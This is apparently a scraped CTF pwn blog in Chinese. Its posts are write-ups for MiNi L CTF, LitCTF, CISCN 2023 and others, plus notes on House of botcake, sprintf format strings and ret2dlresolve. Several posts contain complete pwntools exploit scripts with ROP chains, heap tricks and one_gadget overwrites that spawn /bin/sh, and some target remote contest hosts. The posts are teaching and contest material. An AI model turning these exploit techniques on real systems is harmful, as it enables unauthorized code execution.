还有一个cmp需要注意\n\nrsi的值需要大于rcx才行 setz这条汇编指令把ZF标志位的值传给了cl寄存器 这里我试了下貌似都是1 所以rcx最后的值为r12-r14+1\n也就是0x19 那么rsi的值只要大于这一个就可以了 而rsi的值有rbx+0x20处决定\n那么还有最后一步了 就是调用free函数时的rdi寄存器\n\n这个地址相当于chunk的size域 覆盖的时候替换为&#x2F;bin&#x2F;sh即可\n那么到这里覆盖就结束了 下面是模板 一些地址偏移自己注意一下\npayload = cyclic(0x10)+ p64(2) +b&#x27;/bin/sh\\x00&#x27;  #从低地址处的一个chunk堆溢出覆盖 所以cyclic可以忽略掉 从p64(2)开始覆盖fake file的prev_size域fake_file = p64(system_addr)*2fake_file += p64(0)+p64(0x200)+p64(0)+p64(heap_addr+0xb30-0x8)+p64(heap_addr+0xb30-0x8+0x18)fake_file = fake_file.ljust(0xc8,b&#x27;\\x00&#x27;)fake_file += p64(io_str_jump)payload += fake_file\n\n","categories":["堆"]},{"title":"MiNi L CTF2023","url":"/2023/05/15/MiNi-L-CTF2023/","content":"3calls这题的调试是个问题 比赛的时候一直卡在调试 赛后看了wp 才意识到 原来是另外一个进程导致的调试失败 只要在ida里把check函数改成nop就行了\n\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int i; // [rsp+8h] [rbp-28h]  int j; // [rsp+Ch] [rbp-24h]  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  libc = (__int64)(&amp;printf - 49390);  printf(&quot;gift: %p\\n&quot;, &amp;printf - 49390);  for ( i = 0; i &lt;= 2; ++i )    read(0, &amp;F[i], 8uLL);  check();  puts(&quot;good job!&quot;);  for ( j = 0; j &lt;= 2; ++j )    F[j]();  return 0;&#125;\n\n直接给了libc基址 同时可以输入3个字长 并且对这三个字长进行检查 跟进一下check函数\nunsigned __int64 check()&#123;  int v0; // ebx  int i; // [rsp+0h] [rbp-C0h]  int j; // [rsp+4h] [rbp-BCh]  FILE *stream; // [rsp+8h] [rbp-B8h]  int v5; // [rsp+14h] [rbp-ACh]  int v6; // [rsp+18h] [rbp-A8h]  int v7; // [rsp+1Ch] [rbp-A4h]  char v8[96]; // [rsp+20h] [rbp-A0h] BYREF  char s2[40]; // [rsp+80h] [rbp-40h] BYREF  unsigned __int64 v10; // [rsp+A8h] [rbp-18h]  v10 = __readfsqword(0x28u);  v5 = 0;  v6 = 0;  v7 = 0;  for ( i = 0; i &lt;= 2; ++i )    sprintf(&amp;v8[32 * i], &quot;%016llx&quot;, (char *)F[i] - libc);  stream = popen(cmd, &quot;r&quot;);  if ( (__int64)stream &lt;= 0 )  &#123;    puts(&quot;popen failed!&quot;);    exit(-1);  &#125;  while ( (unsigned int)__isoc99_fscanf(stream, &quot;%s&quot;, s2) != -1 )  &#123;    for ( j = 0; j &lt;= 2; ++j )    &#123;      v0 = *(&amp;v5 + j);      *(&amp;v5 + j) = (strcmp(&amp;v8[32 * j], s2) == 0) | v0;    &#125;  &#125;  pclose(stream);  if ( (v6 &amp; v5 &amp; v7) == 0 )  &#123;    puts(&quot;Not libc symbols!&quot;);    exit(-1);  &#125;  return v10 - __readfsqword(0x28u);&#125;\n\n重点注意一下这一句stream &#x3D; popen(cmd, “r”);\npopen可以调用shell命令 并且获取其返回值 那么看一下cmd指令是什么 然后直接丢到我们虚拟机里的shell执行一下 大概就知道check是干啥的\n\n返回值是一大串偏移量 应该很明显看的出来是libc函数的偏移量 加上下面的for循环 所以可以得到check函数是检测输入的三个字长是否是libc函数\n调用三次函数来获取shell 那么肯定要用到system函数 至于rdi参数要怎么操控 那么只能采用输入函数了\nread scanf gets 这些常见的函数 参数构造最容易的就是gets了 并且其输入的地址也是由rdi决定 如果输入&#x2F;bin&#x2F;sh 那么rdi参数就是&#x2F;bin&#x2F;sh字符串\n不过你直接打断点调试行不通的  popen函数会产生新的进程 影响我们gdb调试 所以我们直接在ida里面把call check改了\n\n\n可以看到gets函数rdi参数是一个可写可读的地址 那这样就方便了 我们直接读入&#x2F;bin&#x2F;sh字符串 但是很快就会发现程序EOF了\nEOF的原因比较复杂 我也只是调试了一点点出来 很多地方还是不懂 权当听个大概吧\n\n出问题的就在这个判断 导致进入了__lll_lock_wait_private函数 这个函数的具体用处我也不是很清楚 反正执行的后果就是当前进程会被挂起 也就导致了我们的程序无法继续执行了 也有想过绕过 但是貌似就算相等也过不去 ZF标志位还是为0\n\n最后的解决办法跟我们的gets函数执行逻辑有关系 其会先调用这个函数\n\n这个函数的本质是通过read来输入字节 不过每次只有1字节 随后每次接收完以后进行判断 如果为\\n就停止gets\n所以我们直接输入\\n 就不会执行到后面的__lll_lock_wait_private \n\n随后我们再次调用gets函数就正常了 也是很神奇 不知道为啥 但是你会发现最后system执行的参数为&#x2F;bin.sh\n还是需要动调看一下 问题出在gets函数的最后几步\n\n自己看看应该也能懂 这样就不多说了 最后直接system就行了\nfrom pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;node5.anna.nssctf.cn&quot;,28881)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;gift: 0x&quot;)libc_addr = int(io.recv(12),16)success(&quot;libc_addr :&quot;+hex(libc_addr))gets_addr = libc_addr + libc.sym[&#x27;gets&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]io.send(p64(gets_addr))io.send(p64(gets_addr))io.send(p64(system_addr))# gdb.attach(io,&#x27;b *gets+201&#x27;)# pause(0)io.send(b&#x27;\\n&#x27;)# gdb.attach(io,&#x27;b *$rebase(0x158E)&#x27;)io.sendline(b&#x27;/bin0sh&#x27;)# pause()io.interactive()# gdb.attach(io,&#x27;b *_IO_file_underflow+134&#x27;)\n\n","categories":["wp"]},{"title":"LitCTF2023","url":"/2023/05/15/LitCTF2023/","content":"跟着vn的师傅打 拿了第七 但是说实话pwn题出的太烂了 唯一有难度的一题还是抄的祥云杯2022-protocol  考点一模一样\n从pwn方向我的评价就是一坨狗屎 其他方向不会不做评价\n[LitCTF 2023]ezlogin静态编译 删除了符号表  用sig文件解决就行 使用自己百度 这里贴一个比较齐全的sig文件仓库\npush0ebp&#x2F;sig-database: IDA FLIRT Signature Database (github.com)\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  __int64 v3; // rdx  __int64 v4; // rdx  __int64 v6; // [rsp+0h] [rbp-108h] BYREF  setbuf(off_6B97A8, 0LL, envp);  setbuf(off_6B97A0, 0LL, v3);  setbuf(off_6B9798, 0LL, v4);  while ( !(unsigned int)vuln(&amp;v6) )    ;  IO_puts(&quot;GoodTime.&quot;);  return 0;&#125;\n\n重复执行vuln函数 当vuln函数的返回值为1时退出循环\n_BOOL8 __fastcall vuln(__int64 a1)&#123;  char v2[536]; // [rsp+0h] [rbp-218h] BYREF  IO_puts(&quot;Input your password:&quot;);  memset(v2, 0, 0x200uLL);  if ( (unsigned __int8)_libc_read(0, v2, 0x200uLL) &gt; 0x50u )    exit_0(-1);  j_strcpy_ifunc(a1, v2);  return strcmp(v2, &quot;PASSWORD&quot;) == 0;&#125;\n\n有一个strcpy的栈溢出 a1相当于v6 a1可以输入0x200字节 而v6只需要0x100字节就可以溢出 不过对于read函数有一个返回值检测\n超过0x50就终止程序 但是实际的比较存在漏洞 我们来看一下汇编\n.text:0000000000400C07                 cmp     al, 50h ; &#x27;P&#x27;.text:0000000000400C09                 ja      short loc_400C3E\n\n对比的是al寄存器 al寄存器是rax的低八位 也就是说如果我们这个数值比较大 使得二进制形式的数值的1集中在前面 低8位的数值就比较小 测试下来就是不能超过0x150字节\n那么我们就可以构造rop链了 不过由于\\x00会被strcpy截断 所以我们需要先覆盖一下payload中的\\x00为其他字节\n随后由后往前写 就是payload不断缩减 在\\x00字节处做标记 输出的时候多一个\\x00 用来覆盖原本的\\x00\n完整exp:\nfrom pwn import*io = remote(&quot;node5.anna.nssctf.cn&quot;,28824)#io = process(&quot;./pwn4&quot;)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn4&quot;)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]syscall = 0x448D22rdi_addr = 0x400706rsi_addr=0x410043 rdx_addr = 0x448c95 rax_addr = 0x4005af bss_addr = elf.bss(0x300)start_addr = 0x400AB0main_addr = 0x4005c0ret_addr = 0x400416payload = b&#x27;PASSWORD&#x27;+cyclic(0x100)+p64(rdi_addr)+p64(0)+p64(rax_addr)+p64(0)+p64(rsi_addr)+p64(bss_addr)+p64(syscall)+p64(main_addr)payload = payload.ljust(0x200,b&#x27;a&#x27;)#payload = payload.replace(b&#x27;\\x00&#x27;, b&#x27;\\x11&#x27;)list = []for i in range(0x198) :    if payload[i] == &#x27;\\x00&#x27; :        list.append(i)        payload = payload[0:i] + b&#x27;\\x66&#x27; + payload[i+1:]list = list[::-1]for i in list :    payload = payload[0:i]+b&#x27;\\x00&#x27;    io.recvuntil(&quot;Input your password:&quot;)    # gdb.attach(io,&#x27;b *0x400C07&#x27;)    # pause(0)    io.send(payload)    # pause()payload = &quot;PASSWORD\\x00&quot;io.recvuntil(&quot;Input your password:&quot;)# gdb.attach(io,&#x27;b *0x40061A&#x27;)# pause(0)io.send(payload)# pause()io.sendline(b&#x27;/bin/sh\\x00&#x27;)payload = b&#x27;PASSWORD&#x27;+cyclic(0x100)+p64(rax_addr)+p64(59)+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(0)+p64(syscall)payload = payload.ljust(0x200,b&#x27;a&#x27;)list = []for i in range(0x200) :    if payload[i] == &#x27;\\x00&#x27; :        list.append(i)        payload = payload[0:i] + b&#x27;\\x66&#x27; + payload[i+1:]list = list[::-1]for i in list :    payload = payload[0:i]+b&#x27;\\x00&#x27;    io.recvuntil(&quot;Input your password:&quot;)    io.send(payload)payload = &quot;PASSWORD\\x00&quot;io.recvuntil(&quot;Input your password:&quot;)io.send(payload)io.interactive()\n\n","categories":["wp"]},{"title":"House of botcake","url":"/2023/05/21/House-of-botcake/","content":"碎碎念应该不算一个链 只能说一种堆风水的手法吧 叫这个名字有点怪怪的 不过总归是一个很好的手法\n适用于没有堆溢出 但是有UAF  而且比较少见 不过不排除有的厉害的师傅自己就能发现这个手法。。。 我还是太菜了\n分析2.27 以后(指9.0那个新版本) tcachebin 新增了key 给double free起了干扰的作用 如果要绕过 有三种办法\n1.覆盖tcachebin的bk域 也就是key\n2.修改tcachebin chunk的size 使其key检测的时候绕开原本的链表\n3.house of botcake\n这个手法的本质 是利用chunk overlap来突破没有堆溢出的限制 覆盖fd域\n我们知道 在chunk被释放进入tcachebin后 其bk域会被写入key 如果想要再次释放 就需要绕过key 但是 如果chunk是先被释放进入unsortedbin呢 当我们填满tcachebin链表后 再次释放同大小的chunk 就会释放进入unsortedbin 此时再从tcachebin链表中申请出来一个chunk 再次释放已经被释放进入unsortedbin chunk 就可以成功释放两次\n此时如果再次申请一个比原本的chunk大的chunk 就会从合并后的chunk中分配 从而可以覆盖到位于tcachebin chunk的fd域 这样就达到了任意写的目的 \n上面这么讲可能不明不白 下面直接来看吧\n利用首先填满tcachebin的一个链表\nfor i in range(9):    add(0x200)for i in range(7):    delete(i+2)delete(0)delete(1)\n\nchunk0和chunk1用来释放进入unsortedbin\n\n此时二者成功合并\n我们再次申请一个0x200的chunk 把链表腾出一个位置 随后再次释放chunk1 成功进入tcachebin链表\nadd(0x200)delete(1)\n\n\n此时随便申请一个比0x200大 比0x410小的chunk 就可以触碰到chunk1的fd域了 从而实现任意地址写\n","categories":["堆"]},{"title":"另类格式化字符串漏洞","url":"/2023/05/21/%E5%8F%A6%E7%B1%BB%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/","content":"这篇主要介绍的是spritf函数引起的格式化字符串漏洞 总体的利用方式和printf是一样的\n先来看一下sprintf函数的用法 其一共有三个参数 在不使用格式化字符的情况下 第三个参数可有可无\n#include&lt;stdio.h&gt;void vuln()&#123;    char buf[0x20];    sprintf(buf,&quot;hello\\n&quot;);    printf(buf);&#125;int main()&#123;    vuln();&#125;\n\n主要的作用就是把hello这个字符串读入到buf数组变量中 来看一下运行的结果\n\n如果使用上格式化字符\n#include&lt;stdio.h&gt;void vuln()&#123;    char buf[0x20];    char a[0x20] = &quot;hello&quot;;    sprintf(buf,&quot;%s\\n&quot;,a);    printf(buf);&#125;int main()&#123;    vuln();&#125;\n\n\n这里可能会误解为传入到buf中的值是%shello 随后是给予printf函数利用格式化字符串输出 其实不然 这里替换成puts来试一下\n#include&lt;stdio.h&gt;void vuln()&#123;    char buf[0x20];    char a[0x20] = &quot;hello&quot;;    sprintf(buf,&quot;%s&quot;,a);    puts(buf);&#125;int main()&#123;    vuln();&#125;\n\n断点打在sprintf函数这里来看一下\n\n来看执行后0x7fffffffe050地址的值会被赋值成什么\n\n由此可见 这里的格式化字符实际是决定vararg参数存储的类型 如果我们替换成%p呢\n\n印证了猜想 那么%n呢 这个printf最强大的漏洞 可以做到任意地址写任意值 在这里是否奏效呢\n#include&lt;stdio.h&gt;void vuln()&#123;    char buf[0x20];    sprintf(buf,&quot;a%7$n&quot;);&#125;int main()&#123;    vuln();&#125;\n\n不同于其他格式化字符 %n在sprintf就可以起到任意写的作用 同时又和printf一样 默认是修改4个字节 如果想要修改8字节 就需要lln\n\n\n如果我们修改蓝框中的值 使其占满8字节 再来覆盖看看\n\n\n本质还是和printf差不多 在关键的任意写这块漏洞利用上\n","categories":["栈"]},{"title":"Ret2dl","url":"/2023/05/22/Ret2dl/","content":"前言一种基于延迟绑定机制的利用办法 适用于没有puts等输出函数的情况下 伪造结构体 使得任意函数的got表解析成system函数 从而getshell 应该算是pwn学习初期最早的伪造思想了 对于初期的学习还是不那么容易懂的 这个知识点我学的也比较晚 最早出现是刚学pwn没几个月的ISCTF 2022 那个时候做不出来 然后也没去复现 就一直拖到了现在 所以这篇文章的一些描述可能不是很详细 新学pwn的如果哪里看不懂 记得联系我 我删改一下\n利用本质32位 Partical RELRO被我们熟知的plt表和got表 是因为延迟绑定机制的出现 这个机制主要是由于可以大幅度减少程序的体积 部分程序调用到的函数比较少 如果全部加载库 很容易就造成体积过大 所以出现了动态链接 \nRELRO这个保护机制跟动态链接关系比较大 如果是FULL RELRO 那么就会在程序载入时就完成所有函数的got表解析    也就无从谈起利用\n\n观察一下一个read函数的解析过程 在初次调用的时候 got表中指向的是plt表 把0入栈了 同时跳转到了0x8048380\n同样入栈了一个参数 这个参数位于got表的第二个元素 我们在动态延迟绑定的文章说过 是模块的ID 随后跳转的地址是got表的第三个元素 同时是我们今天利用的关键 _dl_runtime_resolve函数的地址\n下面就来详细分析一下这个函数是如何解析真实地址的\n诸如io链中存在vtable这样的结构体 用来索引函数  _dl_runtime_resolve也有对应的结构体来索引各种表项 用来满足其寻找对应函数真实地址的需求\n.dynamic段就是这样一个结构体 其存放了动态链接的几个关键表项.dynsym .dynstr .rela.plt等\n_dl_runtime_resolve利用入栈的模块ID 这里又称为link_map 可以访问到dynamic段 从而获取其他表的地址\n这里我们先不讲这几个表项的作用 跟着思路往下走\n在_dl_runtime_resolve拿到表项地址以后 他怎么知道要寻找的是哪个函数的真实地址呢 或者说 小明妈妈让他买酱油 这个行为确实是触发了 但是小明不知道要买什么品牌的酱油\n这个时候其会先寻找重定位表项 同样的 其仍然需要一个索引 否则他怎么知道要找哪个函数的重定位表项\n\n而这个偏移 就是最开始入栈参数\n\n索引到重定位表项后  其就需要函数名 以此在so文件中寻找对应的真实地址 不过在索引dynstr到这个段获取字符串前 先需要到达dynsym段进行一个中转 而寻找到对应地址的偏移 就是上面的第二个参数\n就拿我们上面的read的重定位表举例 第二个参数是0x107 这个值是怎么得到的呢\n首先 7是固定的 可以理解为函数的标识 这个值可不能进行更改 在寻址过程中还会进行检查\n前面的0x100是如何得到的呢  实际是由1&lt;&lt;8得到 这里的逻辑左移八位是固定的格式 _dl_runtime_resolve在读取到0x107后 会自动的逻辑右移 得到一个1\n这个1乘以0x10 (这个值是dym结构体一个成员的大小) 就是dynsym表的偏移了\n\n我们来观察一下dynsym表的内容\n\n除开0x804820c所对应的_gmon_start函数比较特殊之外 其余的sym表的第四个参数固定为0x12 这在后续中也存在检查\n中间两个参数都是0 没啥可说的 来看一下第一个参数 这个参数就是用来索引dynstr表 直接对应的就是函数字符串存储地址减去dynstr的起始地址 \n到此为止 _dl_runtime_resolve函数的调用流程就已经清晰了 稍微总结一下 索引的流程为:\n压入link_map参数 索引dynamic段 根据压入的偏移参数寻址重定位表项\n根据重定位表项寻址dynsym表 根据dynsym表索引dynstr表 最后获取到函数名\n所以我们只要环环相扣 一步步伪造偏移 劫持索引流 就可以做到劫持read函数(任意函数都行) 将其真实地址的解析修改为system函数 就可以getshell\n伪造32位 Partical RELRO借助这样一个32位的程序来演示 程序的逻辑非常简单 就一个read 构成栈溢出 可以自行编译\nssize_t vuln()&#123;  char buf[40]; // [esp+0h] [ebp-28h] BYREF  return read(0, buf, 0x100u);&#125;\n\n\n由于我们需要伪造偏移 所以需要有一个可写可读的地址来存放我们的fake struct\n理所当然的是bss段 于是这里直接构造read链 往bss段上读入数据\n随后我们来想一下如何伪造偏移\n上面提到 _dl_runtime_resolve解析dynamic段 需要靠压入的link_map参数 我们可以利用这个gadget来实现\n.plt:08048380 sub_8048380     proc near               ; CODE XREF: .plt:0804839B↓j.plt:08048380                                         ; .plt:080483AB↓j ....plt:08048380 ; __unwind &#123;.plt:08048380                 push    ds:dword_804A004.plt:08048386                 jmp     ds:dword_804A008.plt:08048386 sub_8048380     endp\n\n随后我们应该跟上用来索引重定位表项的偏移 这里的偏移就是fake_relplt_addr - relplt_addr\n随后 我们需要伪造重定位表项 其第一个参数为想要误导的函数got表地址(哪怕是已经解析过真实地址的函数也可以 甚至是任意的可写地址都行 不过为了方便getshell 一般都是放到函数的got表里) 第二个参数用来索引dynsym表\n第二个参数的伪造可以说是最关键的一步 因为dynsym其一个成员是0x10字节 同时还存在着对齐 所以要留意一下原本的dynsym起始地址的最后一位 比如我这个程序其最后一位是0xc 所以我伪造的dynsym的起始地址最后一位也应该为0xc\n同时 fake_dynsym与dynsym的偏移 需要经过我上面提到的计算 最后的结果用来充当第二个参数\n接着就是dynsym的伪造问题  一共有四个参数 后三个参数不用管  固定是 0，0，0x12\n而第一个参数为fake_dynstr和dynstr的偏移 直接相减就行了\n如果最后我们成功劫持了函数的解析 成功在read函数的got表中写入了system函数的真实地址  我们要如何getshell呢\n我们知道 动态链接的最后 在得到了真实地址后 会重新调用一次该函数 所以 我们只需要重新调用函数时 rsp指针指向的第二个字长处(第一个字长为返回地址 拿垃圾数据填就行了)存放着binsh字符串地址即可\n参考模板:\nplt0 = elf.get_section_by_name(&#x27;.plt&#x27;).header.sh_addrrel_plt = elf.get_section_by_name(&#x27;.rel.plt&#x27;).header.sh_addrdynsym = elf.get_section_by_name(&#x27;.dynsym&#x27;).header.sh_addrdynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).header.sh_addrbss_addr = elf.bss(0x800)fakesym_addr = bss_addr+0x1cname_addr = fakesym_addr+0x10-dynstrfakesym = p32(name_addr)+p32(0)*2+p32(0x12)offset = int((fakesym_addr-dynsym)/0x10)offset = offset&lt;&lt;8fake_relplt = p32(elf.got[&#x27;read&#x27;])+p32(offset+7)read_addr = elf.sym[&#x27;read&#x27;]vuln_addr = elf.sym[&#x27;vuln&#x27;]payload = cyclic(0x28+0x4)+p32(read_addr)+p32(vuln_addr)+p32(0)+p32(bss_addr)+p32(0x100)# gdb.attach(io,&#x27;b *0x804854B&#x27;)# pause(0)io.send(payload)binsh_addr = bss_addr+0x80payload = p32(plt0)+p32(bss_addr+0x10-rel_plt)payload += cyclic(0x4)payload += p32(binsh_addr)payload += fake_relpltpayload += cyclic(0x4)payload += fakesympayload += b&#x27;system\\x00\\x00&#x27;payload = payload.ljust(0x80,b&#x27;\\x00&#x27;)payload += b&#x27;/bin/sh\\x00&#x27;io.send(payload)leave_addr = 0x08048448payload = cyclic(0x28)+p32(bss_addr-0x4)+p32(leave_addr)io.send(payload)io.interactive()\n\n","categories":["栈"]},{"title":"2023闽盾杯复赛","url":"/2023/05/27/2023%E9%97%BD%E7%9B%BE%E6%9D%AF%E5%A4%8D%E8%B5%9B/","content":"没有参加复赛 倒是开赛的时候别的师傅给了附件 做了做 最后是一血\n一道2.27的堆 原题附件给的跟远程的不一样 坑死了 最后是用2.27 1.6的小版本打通的\n代码审计一下 可以得知没有free chunk的机会 但是可以堆溢出覆盖nextchunk的size域 \n这种情况首先想到了house of orange获得unsortedbin的手法 覆盖一下top chunk\n随后我们就泄露出了libc地址\n2.23跟2.27的最大差别就是多了tcachebin 在想下一步利用的时候 回想起了以前做过的一道house of force 可以申请到top chunk低地址处的chunk 利用这一点可以覆盖tcachebin结构体的entry指针数组 从而任意写 最后直接往malloc_hook里面写入onegadget就行了\nfrom pwn import*from ctypes import *#io = process(&quot;./pwn&quot;)io = remote(&quot;39.104.26.167&quot;,59599)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;)#libc = ELF(&quot;./libc-2.27.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug():    gdb.attach(io)    pause()def add(index,size):    io.recvuntil(&quot;Your choice: &quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size: &quot;)    io.sendline(str(size))def edit(index,content):    io.recvuntil(&quot;Your choice: &quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))    io.recvuntil(&quot;Content: &quot;)    io.send(content)def show(index):    io.recvuntil(&quot;Your choice: &quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))def delete(index):    io.recvuntil(&quot;Your choice: &quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;Index: &quot;)    io.sendline(str(index))add(0,0x18)payload = cyclic(0x18)+p64(0xd91)edit(0,payload)add(1,0x1008)add(2,0x100)show(2)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-libc.sym[&#x27;__malloc_hook&#x27;]-1632-0x10success(&quot;libc_addr :&quot;+hex(libc_addr))payload = cyclic(0x1008)+p64(0xffffffffffffffff)edit(1,payload)# gdb.attach(io,&#x27;b *$rebase(0xA54)&#x27;)# pause(0)add(3,-0x22020)add(4,0x1000)malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]realloc_hook = libc_addr + libc.sym[&#x27;__realloc_hook&#x27;]realloc_addr = libc_addr + libc.sym[&#x27;realloc&#x27;]payload = cyclic(0x40)+p64(realloc_hook)+b&#x27;\\n&#x27;edit(4,payload)add(5,0x18)onegadget_addr = libc_addr +   0x4f302payload = p64(onegadget_addr)+p64(realloc_addr+10)+b&#x27;\\n&#x27;edit(5,payload)add(6,0x100)io.interactive()\n\n","categories":["wp"]},{"title":"2023Ciscn初赛","url":"/2023/05/28/2023Ciscn/","content":"收获满满的一次比赛 \nwp就用赛后提交的吧  涉及到重要的知识点都会开新专栏介绍的\n烧烤摊儿在购买物品时 对于数量的判断不严格 存在整数溢出漏洞 输入负数个物品 最后的金额反而会增加 随后直接提供了栈溢出的机会 静态编译的题目 可以直接ROPgadget –binary pwn –ropchain获取一段rop链 getshell\nfrom pwn import*from ctypes import *#io = process(&quot;./pwn&quot;)io = remote(&quot;123.56.116.45&quot;,26836)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;/home/test/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;1&#x27;)io.recvuntil(&quot;3. 勇闯天涯&quot;)io.sendline(b&#x27;1&#x27;)io.recvuntil(&quot;来几瓶？&quot;)io.sendline(b&#x27;-20000&#x27;)io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;4&#x27;)io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;5&#x27;)io.recvuntil(&quot;烧烤摊儿已归你所有，请赐名：&quot;)p = b&#x27;a&#x27;*0x28p += pack( 0x000000000040a67e) # pop rsi ; retp += pack( 0x00000000004e60e0) # @ .datap += pack( 0x0000000000458827) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack( 0x000000000045af95) # mov qword ptr [rsi], rax ; retp += pack( 0x000000000040a67e) # pop rsi ; retp += pack( 0x00000000004e60e8) # @ .data + 8p += pack( 0x0000000000447339) # xor rax, rax ; retp += pack( 0x000000000045af95) # mov qword ptr [rsi], rax ; retp += pack( 0x000000000040264f) # pop rdi ; retp += pack( 0x00000000004e60e0) # @ .datap += pack( 0x000000000040a67e) # pop rsi ; retp += pack( 0x00000000004e60e8) # @ .data + 8p += pack( 0x00000000004a404b) # pop rdx ; pop rbx ; retp += pack( 0x00000000004e60e8) # @ .data + 8p += pack( 0x4141414141414141) # paddingp += pack( 0x0000000000447339) # xor rax, rax ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000496710) # add rax, 1 ; retp += pack( 0x0000000000402404) # syscall# gdb.attach(io,&#x27;b *0x401FAE&#x27;)# pause(0)io.sendline(p)# pause()io.interactive()\n\nStrangeTalkBot2.31的一道堆题 但是菜单传参部分是用protobuf来的 先分解出proto文件\nprotoc -I=./ --python_out=./ ctf.proto\n\n再得到ctf_pb2.py文件\nsyntax = &quot;proto2&quot;;package Devicemsg;message pwn &#123;    optional int64 actionid = 1;    optional int64 msgidx = 2;    optional int64 msgsize = 3;    optional bytes msgcontent = 4;&#125; \n\n最后import导入 就可以菜单交互了\n总体的思路就是利用UAF 来double free 